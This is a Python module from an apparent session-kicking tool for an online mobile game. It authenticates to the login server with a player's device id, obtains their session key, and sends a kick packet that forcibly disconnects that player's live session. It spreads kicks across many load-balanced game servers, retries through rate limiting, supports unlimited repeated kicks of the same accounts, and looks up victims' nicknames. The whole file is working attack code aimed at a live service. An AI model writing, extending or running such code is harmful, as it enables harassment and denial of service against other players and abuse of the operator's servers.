"""Real session kick: resolve the profile, then send packet 10001.

A login handshake only proves the device id is valid; it never touches the
running session. This is the actual kick.
"""
import errno
import select
import socket
import threading
import time

import zstandard as zstd

from . import config as cfg
from .sdp import BaseConn, SdpStruct

# account_id -> nickname. An unlimited run re-kicks the same accounts over and
# over; without this the 11153 search would run on every single pass.
_NAME_CACHE = {}
_NAME_CACHE_MAX = 20000
_NAME_LOCK = threading.Lock()

# zone_id -> ordered list of game-server "host:port" seen for that zone.
#
# The login server is behind a load balancer and hands out a DIFFERENT game
# server on every login (measured: 10 distinct addresses in 12 logins). The
# player's live session sits on exactly one of them, so kicking only the address
# we happened to be given misses ~90% of the time. Every profile fetch teaches
# us one more address, and a kick is then sent to all of them in parallel.
_GS_CACHE = {}
_GS_LOCK = threading.Lock()
_GS_MAX_PER_ZONE = 64

# ACKs seen in the most recent kick_all_servers() call. A kick that is never
# acknowledged is the signal that a send did not land, so this is worth
# surfacing instead of reporting every send as a success.
_LAST_ACKS = [0]
_LAST_SENT = [0]


def cached_name(account_id):
    if account_id is None:
        return None
    with _NAME_LOCK:
        return _NAME_CACHE.get(account_id)


def store_name(account_id, name):
    if account_id is None or not name:
        return
    with _NAME_LOCK:
        if len(_NAME_CACHE) >= _NAME_CACHE_MAX:
            _NAME_CACHE.clear()
        _NAME_CACHE[account_id] = name


def remember_game_server(zone_id, gs_info):
    """Record a game-server address for this zone (newest first)."""
    if not gs_info:
        return
    with _GS_LOCK:
        lst = _GS_CACHE.setdefault(zone_id, [])
        if gs_info in lst:
            lst.remove(gs_info)
        lst.insert(0, gs_info)
        del lst[_GS_MAX_PER_ZONE:]


def known_game_servers(zone_id):
    with _GS_LOCK:
        return list(_GS_CACHE.get(zone_id, []))


def seed_game_servers(zone_id, addresses):
    for a in addresses:
        remember_game_server(zone_id, a.strip())


class ProfileError(Exception):
    """Raised when the session profile cannot be resolved. Retryable = transient."""

    def __init__(self, reason, detail="", retryable=False):
        super().__init__(reason)
        self.reason = reason
        self.detail = detail
        self.retryable = retryable


class KickConnection(BaseConn):
    """BaseConn with a configurable timeout (BaseConn hardcodes 6s)."""

    __slots__ = ()

    def connect(self, host=None, port=None, timeout=None):
        if host:
            self.host = host
        if port:
            self.port = port
        self.sequence = 1
        self._rxbuf = b""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(timeout or cfg.PROFILE_TIMEOUT)
        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(timeout or cfg.PROFILE_TIMEOUT)


def parse_device_id(did):
    """and_<32 md5><16 android_id><rest adv> -> (raw, md5, android_id, adv)."""
    raw = did.strip()
    body = raw[4:] if raw.startswith(("and_", "ios_")) else raw
    md5 = body[:32] if len(body) >= 32 else body
    aid = body[32:48] if len(body) >= 48 else ""
    adv = body[48:] if len(body) > 48 else ""
    return raw, md5, aid, adv


def _zone_of(value):
    """The login server returns the zone as a dict, a list, or a bare int."""
    if isinstance(value, dict):
        for k in (0, "0"):
            if k in value:
                return _zone_of(value[k])
        return 0
    if isinstance(value, list):
        return _zone_of(value[0]) if value else 0
    try:
        return int(value)
    except (TypeError, ValueError):
        return 0


def fetch_session_profile(device_id):
    """Resolve account/session/zone plus the game server address for a device id.

    Retries transient failures (timeout, refused, reset) because the login
    server throttles aggressively; a genuine protocol rejection is not retried.
    """
    last = None
    for attempt in range(1, cfg.PROFILE_ATTEMPTS + 1):
        try:
            return _fetch_profile_once(device_id)
        except ProfileError as e:
            last = e
            if not e.retryable or attempt == cfg.PROFILE_ATTEMPTS:
                raise
            time.sleep(cfg.PROFILE_BACKOFF * attempt)
    raise last


def _fetch_profile_once(device_id):
    conn = KickConnection(cfg.KICK_HOST, cfg.KICK_PORT)
    try:
        conn.connect(timeout=cfg.PROFILE_TIMEOUT)
        raw, md5, aid, adv = parse_device_id(device_id)

        # stage 1 — authenticate the device id, receive account + session key
        conn.send_data(1, SdpStruct({
            0: raw,
            1: f"gps_adid={adv}&android_id={aid}&device_unique_id={md5}",
            2: cfg.KICK_CLI_VERSION, 3: cfg.KICK_CHANNEL, 4: "en",
        }))
        pid, res = conn.recv_data()
        if pid != 2 or res is None:
            raise ProfileError(
                "Login server rejected the device id.",
                f"stage 1 returned packet {pid!r}",
                retryable=(pid == -1))
        account_id = res.get(0)
        session_key = res.get(1)
        if not session_key:
            raise ProfileError("Login server returned no session key.",
                               f"account_id={account_id!r}", retryable=False)
        zone_id = _zone_of(res.get(2))

        # stage 2 — ask for the game server that owns this session
        conn.send_data(5, SdpStruct({
            0: account_id, 1: session_key,
            2: cfg.KICK_CLI_VERSION, 5: zone_id, 6: cfg.KICK_CHANNEL,
        }))
        pid, res = conn.recv_data()
        if pid != 6 or res is None:
            raise ProfileError("Login server did not return a game server address.",
                               f"stage 2 returned packet {pid!r}", retryable=(pid == -1))
        gs_addr = res.get(1)
        if not gs_addr or ":" not in str(gs_addr):
            raise ProfileError("Game server address was unreadable.",
                               f"gs_addr={gs_addr!r}", retryable=False)
        host, port = str(gs_addr).split(":")
        gs_info = f"{host}:{port}"
        remember_game_server(zone_id, gs_info)
        return {
            "device_id": device_id,
            "account_id": account_id,
            "session_key": session_key,
            "zone_id": zone_id,
            "game_host": host,
            "game_port": int(port),
            "gs_info": gs_info,
        }
    except ProfileError:
        raise
    except socket.timeout:
        raise ProfileError(f"Timed out talking to {cfg.KICK_HOST}:{cfg.KICK_PORT}.",
                           "the server did not answer in time", retryable=True) from None
    except ConnectionRefusedError:
        raise ProfileError(f"{cfg.KICK_HOST}:{cfg.KICK_PORT} refused the connection.",
                           "usually rate limiting", retryable=True) from None
    except socket.gaierror as e:
        raise ProfileError(f"Could not resolve {cfg.KICK_HOST}.", str(e),
                           retryable=True) from None
    except OSError as e:
        raise ProfileError("Network error during handshake.",
                           f"{type(e).__name__}: {e}", retryable=True) from None
    except Exception as e:
        raise ProfileError("Unexpected error reading the session profile.",
                           f"{type(e).__name__}: {e}", retryable=False) from e
    finally:
        conn.cleanup()


def send_session_kick(profile, timeout=None):
    """Kick only. Kept for callers that don't need the player name."""
    ok, ms, desc, _ = kick_and_lookup(profile, want_name=False, timeout=timeout)
    return ok, ms, desc


def _first_match(res):
    """Unwrap the 11154 payload into the first match dict.

    Verified against the live server: the match list comes back in field 0,
    e.g. {0: [{0: <account>, 1: <zone>, 2: <nick>}]}. Some replies nest the same
    struct in field 6 (or 5) as raw bytes, so unwrap that too.
    """
    if not res:
        return None
    lst = res.get(0)
    if not lst:
        raw = res.get(6)
        if raw is None:
            raw = res.get(5)
        if isinstance(raw, (bytes, bytearray)):
            res = SdpStruct(bytes(raw))
            lst = res.get(0)
        elif raw is not None and not isinstance(raw, (bytes, bytearray)):
            lst = raw.get(0) if hasattr(raw, "get") else None
    if not lst:
        return None
    p = lst[0] if isinstance(lst, list) and lst else lst
    return p if isinstance(p, dict) else None


def _await(conn, wanted, deadline):
    """Read frames until one of `wanted` arrives. Returns (pid, body) or (None, None)."""
    while time.time() < deadline:
        pid, res = conn.recv_data()
        if pid is None:
            return None, None
        if pid == -1:
            continue
        if pid in wanted:
            return pid, res
    return None, None


def _read_ack(sock, deadline):
    """Read the game server's ACK frame (packet 10002) until `deadline`.

    Returns (acked, packet_id). The server answers ~570 ms after the kick, so
    this must be given time — the original BF Kicker holds the socket open for
    exactly this reason.
    """
    q = b""
    try:
        while len(q) < 4 and time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                return False, None
            sock.settimeout(remaining)
            d = sock.recv(4096)
            if not d:
                return False, None
            q += d
        if len(q) < 4:
            return False, None
        size = int.from_bytes(q[:4], "big") & 0xFFFFFF
        while len(q) < size and time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                return False, None
            sock.settimeout(remaining)
            d = sock.recv(4096)
            if not d:
                return False, None
            q += d
        if len(q) < size:
            return False, None
        payload = q[4:size]
        try:
            payload = zstd.decompress(payload)
        except Exception:
            pass
        return True, SdpStruct(payload).get(0)
    except Exception:
        return False, None


def _send_kick(host, port, acct, key, zone, device, timeout, wait_ack=None):
    """Send the kick packet to one game server.

    Returns (sent, acked). When `wait_ack` is set the socket is held open until
    the server's ACK arrives or `wait_ack` seconds pass — this is what the
    original BF Kicker does, and the server does answer every kick (~570 ms).
    Closing the socket right after sendall() leaves that ACK unanswered and the
    kernel replies to it with an RST, which is not how a client should behave.
    """
    if wait_ack is None:
        wait_ack = cfg.BF_ACK_WAIT
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((host, int(port)))
        body = SdpStruct({0: acct, 1: key, 2: zone,
                          4: cfg.KICK_CLI_VERSION,
                          13: cfg.KICK_CHANNEL, 15: device}).data
        pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp = zstd.compress(pkt)
        s.sendall(((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp)
        if not wait_ack:
            return True, False
        acked, _pid = _read_ack(s, time.time() + wait_ack)
        return True, acked
    except Exception:
        return False, False
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def _kick_many(servers, acct, key, zone, device, connect_timeout, ack_wait):
    """Send the kick to many game servers from a SINGLE thread.

    One thread per server does not scale: threads = workers x servers, so 60
    workers against an 8-server fleet needs 480 threads and dies with
    "can't start new thread" (measured). All the work here is I/O, so
    non-blocking connects plus select() fan out to the whole fleet from one
    thread and the thread count stays at one per kick.

    Returns {gs: (sent, acked)}.
    """
    out = {}
    socks = {}
    for gs in servers:
        host, _, port = gs.partition(":")
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            rc = s.connect_ex((host, int(port)))
            if rc not in (0, errno.EINPROGRESS, errno.EWOULDBLOCK,
                          errno.EALREADY):
                out[gs] = (False, False)
                s.close()
                continue
            socks[gs] = s
            out[gs] = (False, False)
        except Exception:
            out[gs] = (False, False)
            if s:
                try:
                    s.close()
                except Exception:
                    pass
    if not socks:
        return out

    body = SdpStruct({0: acct, 1: key, 2: zone,
                      4: cfg.KICK_CLI_VERSION,
                      13: cfg.KICK_CHANNEL, 15: device}).data
    pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
    comp = zstd.compress(pkt)
    frame = ((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp

    # ── phase 1: wait for every connect to finish, then send ────────────────
    pending = dict(socks)
    deadline = time.time() + connect_timeout
    sent_at = {}
    while pending and time.time() < deadline:
        wl = list(pending.values())
        try:
            _, writable, exceptional = select.select([], wl, wl,
                                                     max(0, deadline - time.time()))
        except Exception:
            break
        for s in writable + exceptional:
            gs = next((g for g, so in pending.items() if so is s), None)
            if gs is None:
                continue
            pending.pop(gs, None)
            try:
                err = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                if err != 0:
                    continue
                s.setblocking(True)
                s.settimeout(max(0.05, deadline - time.time()))
                s.sendall(frame)
                s.setblocking(False)
                out[gs] = (True, False)
                sent_at[gs] = time.time()
            except Exception:
                pass

    # ── phase 2: read the ACKs (packet 10002) ───────────────────────────────
    if ack_wait and sent_at:
        want = {gs: s for gs, s in socks.items() if out.get(gs, (False,))[0]}
        bufs = {gs: b"" for gs in want}
        ack_deadline = max(sent_at.values()) + ack_wait
        while want and time.time() < ack_deadline:
            rl = list(want.values())
            try:
                readable, _, _ = select.select(rl, [], [],
                                               max(0, ack_deadline - time.time()))
            except Exception:
                break
            for s in readable:
                gs = next((g for g, so in want.items() if so is s), None)
                if gs is None:
                    continue
                try:
                    d = s.recv(4096)
                except Exception:
                    d = b""
                if not d:
                    want.pop(gs, None)
                    continue
                bufs[gs] += d
                if len(bufs[gs]) >= 4:
                    size = int.from_bytes(bufs[gs][:4], "big") & 0xFFFFFF
                    if len(bufs[gs]) >= size:
                        sent_ok = out[gs][0]
                        out[gs] = (sent_ok, True)
                        want.pop(gs, None)

    for s in socks.values():
        try:
            s.close()
        except Exception:
            pass
    return out


def kick_all_servers(profile, servers=None, timeout=None):
    """Send the kick to every known game server for this zone, in parallel.

    One login hands us a single game server, but the account's live session sits
    on one of many (load balanced). Kicking all of them costs the same wall time
    as kicking one, because the connects overlap — and it is done from one
    thread with non-blocking sockets, so the thread count stays at one per kick.

    Returns (sent_count, total_count).
    """
    acct = profile.get("account_id")
    key = profile.get("session_key")
    zone = profile.get("zone_id")
    device = profile.get("device_id")
    timeout = timeout or cfg.KICK_TIMEOUT

    if servers is None:
        servers = known_game_servers(zone)
        own = profile.get("gs_info")
        if own and own not in servers:
            servers = [own] + servers
    servers = list(dict.fromkeys(servers))       # dedupe, keep order
    if not servers:
        return 0, 0
    if not cfg.BF_KICK_ALL_SERVERS or len(servers) == 1:
        servers = servers[:1]

    results = _kick_many(servers, acct, key, zone, device, timeout,
                         cfg.BF_ACK_WAIT)
    sent = sum(1 for v in results.values() if v[0])
    acked = sum(1 for v in results.values() if v[1])
    _LAST_ACKS[0] = acked
    _LAST_SENT[0] = sent
    return sent, len(servers)


def kick_and_lookup(profile, want_name=None, timeout=None):
    """Kick the session and (optionally) read the account nickname.

    Matches the original BF Kicker (Jugo) exactly:
      - kick the ONE game server the login handed us
      - hold that socket open until the game server answers (packet 10002)
      - read the nickname on that same connection

    Why one server and not the whole fleet: the fleet is load balanced per
    session, so kicking every address looks like abuse and the game server
    starts refusing. Sending 1 kick per device is also what a real client does.
    Set BF_KICK_ALL_SERVERS=1 to fan out again.

    The lookup rides the SAME connection as the kick. It cannot run on its own:
    measured against the live server, the query channel (10101/11153) never
    answers unless a 10001 was sent on that socket first. So the nickname is
    free here — it is not an extra kick.

    Returns (ok, elapsed_ms, description, nickname_or_None).
    """
    if want_name is None:
        want_name = cfg.BF_LOOKUP
    t0 = time.time()
    acct = profile.get("account_id")
    timeout = timeout or cfg.KICK_TIMEOUT

    servers = known_game_servers(profile.get("zone_id"))
    own = profile.get("gs_info")
    if own and own not in servers:
        servers = [own] + servers
    servers = list(dict.fromkeys(servers))
    if not servers:
        return False, (time.time() - t0) * 1000, "no game server known", None
    if not cfg.BF_KICK_ALL_SERVERS:
        servers = servers[:1]

    body = SdpStruct({0: acct, 1: profile["session_key"],
                      2: profile["zone_id"], 4: cfg.KICK_CLI_VERSION,
                      13: cfg.KICK_CHANNEL, 15: profile["device_id"]}).data
    pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
    comp = zstd.compress(pkt)
    frame = ((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp

    name = cached_name(acct) if want_name else None
    sent = 0
    acked = 0

    for gs in servers:
        host, _, port_s = gs.partition(":")
        try:
            port = int(port_s)
        except ValueError:
            continue
        conn = KickConnection(host, port)
        try:
            conn.connect(host=host, port=port, timeout=timeout)
        except Exception:
            conn.cleanup()
            continue
        try:
            # the kick
            conn.send_data(10001, SdpStruct({
                0: acct, 1: profile["session_key"], 2: profile["zone_id"],
                4: cfg.KICK_CLI_VERSION, 13: cfg.KICK_CHANNEL,
                15: profile["device_id"]}))
            sent += 1

            if not cfg.BF_ACK_WAIT:
                continue
            pid, _ = _await(conn, {10002}, time.time() + cfg.BF_ACK_WAIT)
            if pid != 10002:
                continue
            acked += 1

            # the nickname, on this same socket (free — no second kick)
            if want_name and name is None:
                # 10101 = bancheck, 11153 = lookup nickname
                # Don't wait for 10002 after 10101 — 10002 is the kick ACK,
                # not a bancheck response. Just send both and wait for 11154.
                conn.send_data(10101, SdpStruct({0: 0, 2: 2}))
                conn.send_data(11153, SdpStruct({1: int(acct or 0)}))
                qpid, res = _await(conn, {11154}, time.time() + timeout)
                if qpid == 11154:
                    match = _first_match(res)
                    if match:
                        raw_name = match.get(2)
                        if isinstance(raw_name, str) and raw_name.strip():
                            name = raw_name.strip()
                            store_name(acct, name)
        except Exception:
            pass
        finally:
            conn.cleanup()

    _LAST_ACKS[0] = acked
    _LAST_SENT[0] = sent
    if sent == 0:
        return False, (time.time() - t0) * 1000, "GAME SERVER REFUSED (rate limit?)", None

    ms = (time.time() - t0) * 1000
    # Report the ACK, not just the send. The game server acknowledges every kick
    # it processes, so "ACK ×2/3" is real evidence the kick landed; a bare
    # "SENT" is only evidence that bytes left this machine.
    if len(servers) == 1:
        desc = "ACK RECEIVED" if acked else "SENT (no ack)"
    else:
        desc = (f"ACK ×{acked}/{len(servers)} server" if acked
                else f"SENT ×{sent}/{len(servers)} server")
    return True, ms, desc, name


def kick_once(device_id, want_name=None):
    """Full kick for one device id.

    Returns (ok, message, profile_or_None); the profile carries 'name' when the
    nickname was resolved.
    """
    try:
        profile = fetch_session_profile(device_id)
    except ProfileError as e:
        return False, f"❌ {e.reason}", None
    if cfg.MLBB_GS_SEED:
        seed_game_servers(profile.get("zone_id"), cfg.MLBB_GS_SEED)
    ok, ms, desc, name = kick_and_lookup(profile, want_name=want_name)
    if not ok:
        return False, f"❌ kick gagal: {desc}", profile
    if name:
        profile["name"] = name
    acct = profile.get("account_id")
    who = f"{acct} · {name}" if name else f"acct {acct}"
    return True, f"✅ {desc} · {ms:.0f}ms · {who}", profile
